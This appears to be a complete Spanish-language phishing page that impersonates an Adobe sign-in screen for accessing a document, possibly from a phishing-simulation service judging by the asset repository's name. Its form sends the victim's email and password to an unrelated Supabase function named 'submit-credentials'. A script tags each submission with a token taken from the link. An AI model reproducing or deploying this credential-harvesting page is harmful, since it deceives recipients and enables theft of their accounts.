<!doctype html>
<html lang="es"><head><meta charset="utf-8">
<title>Adobe - Iniciar sesión</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
  *{box-sizing:border-box}
  body{margin:0;background:#fafafa;font-family:'Adobe Clean','Helvetica Neue',Arial,sans-serif;color:#1d1d1d;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
  .box{background:#fff;width:100%;max-width:420px;padding:40px;border-radius:6px;box-shadow:0 1px 6px rgba(0,0,0,0.08)}
  .logo{height:36px;margin-bottom:24px;display:block}
  h1{font-weight:700;font-size:24px;margin:0 0 24px}
  input{width:100%;padding:12px 14px;font-size:15px;border:1px solid #c8c8c8;border-radius:4px;outline:none;font-family:inherit;margin-bottom:16px}
  input:focus{border-color:#FA0F00}
  button{display:block;width:100%;background:#FA0F00;color:#fff;border:none;padding:13px;font-size:15px;font-weight:700;border-radius:24px;cursor:pointer;font-family:inherit;margin-top:10px}
  button:hover{background:#d80d00}
  .hint{font-size:13px;color:#6e6e6e;margin-top:18px;text-align:center}
  a{color:#1473e6;text-decoration:none}
  a:hover{text-decoration:underline}
</style></head>
<body>
<div class="box">
  <img class="logo" src="https://cdn.jsdelivr.net/gh/mikel-santisteban/deceptics-email-assets@main/adobe.png" alt="Adobe">
  <h1>Acceder al documento</h1>
  <form action="https://amjshbgyuazrtxrokqwy.supabase.co/functions/v1/submit-credentials" method="POST">
    <input type="hidden" name="token" id="token-field">
    <input type="email" name="email" placeholder="Dirección de correo" required autofocus>
    <input type="password" name="password" placeholder="Contraseña" required>
    <button type="submit">Continuar</button>
  </form>
  <p class="hint">¿Aún no tienes cuenta? <a href="#">Crear cuenta</a></p>
</div>
<script>document.getElementById('token-field').value=new URLSearchParams(location.search).get('t')||'';</script>
</body></html>
